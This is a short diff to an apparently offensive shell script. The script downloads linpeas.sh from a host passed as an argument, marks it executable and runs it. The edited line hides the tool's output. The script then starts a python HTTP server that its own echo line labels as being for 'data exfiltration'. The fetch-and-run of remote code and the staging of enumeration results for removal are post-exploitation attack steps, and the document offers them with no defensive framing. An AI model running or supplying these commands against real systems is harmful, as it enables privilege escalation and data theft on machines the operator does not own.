@@ -3,6 +3,6 @@ wget http://$1/linpeas.sh;
 echo "giving linpeas execute permission"
 chmod +x linpeas.sh;
 echo "Running linpeas and saving results into a text file"
-./linpeas.sh > /tmp/results.txt;
+{ ./linpeas.sh > results.txt; } >/dev/null 2>&1
 echo "Setting up a python server for data exfiltration"
 python3 -m http.server 8888;
